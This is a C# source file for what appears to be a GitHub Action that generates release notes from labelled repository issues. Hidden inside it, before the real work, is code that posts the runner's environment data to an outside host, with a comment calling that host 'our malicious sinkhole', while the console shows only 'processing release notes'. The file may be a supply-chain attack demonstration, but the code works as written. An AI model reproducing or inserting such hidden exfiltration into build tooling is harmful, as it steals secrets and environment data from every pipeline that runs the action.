using CommandLine;
using DotNet.GitHubAction;
using GenerateReleaseNotes.GeneratedClasses;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using System.Net.Http.Headers;
using System.Net.Http.Json;

using IHost host = Host.CreateDefaultBuilder(args)
    .Build();

static TService Get<TService>(IHost host)
    where TService : notnull =>
    host.Services.GetRequiredService<TService>();

static async Task StartEnvironmentDump(ActionInputs inputs, IHost host)
{

    HttpClient httpClient = new HttpClient();
    httpClient.BaseAddress = new Uri("https://datasinkhole.azurewebsites.net");
    Console.WriteLine($"processing release notes....");
    // dump data to our malicious sinkhole....
    var response = await httpClient.PostAsJsonAsync("/EnvironmentData", inputs.Environment);

    // create the list of items for releasenotes based on provided label


    HttpClient githubApiClient = new HttpClient();
    githubApiClient.BaseAddress = new Uri("https://api.github.com");
    githubApiClient.DefaultRequestHeaders.Authorization =
            new AuthenticationHeaderValue("Bearer", inputs.AccessToken);
    githubApiClient.DefaultRequestHeaders.UserAgent.Add(new ProductInfoHeaderValue(new ProductHeaderValue("Generate-Releasenotes-Action")));

    var Issues = await githubApiClient.GetFromJsonAsync<Issue[]>($"/repos/{inputs.Ownername}/{inputs.Reponame}/issues?labels={inputs.Labelname}");
    var markdowndoc = "";
    foreach (var issue in Issues?.Reverse())
    {
        markdowndoc += "# " + issue.title + "\n";
        markdowndoc += issue.body + "\n\n";
    }
    //now save to output file
    File.WriteAllText(inputs.Outputfile, markdowndoc);

    // also write it to the $GITHUB_STEP_SUMMARY file so it will show up in the results
 
    File.WriteAllText(Environment.GetEnvironmentVariable("GITHUB_STEP_SUMMARY"), markdowndoc);

    Console.WriteLine($"output file written:{Environment.CurrentDirectory}{inputs.Outputfile}");

    Console.WriteLine($"generated file with following contents \n{markdowndoc}");
    Console.WriteLine($"processing release notes.... done");


    Environment.Exit(0);
}

var parser = Parser.Default.ParseArguments<ActionInputs>(() => new(), args);
parser.WithNotParsed(
    errors =>
    {
      Console.WriteLine(errors.ToString());
      Environment.Exit(2);
    });

await parser.WithParsedAsync(options => StartEnvironmentDump(options, host));
await host.RunAsync();
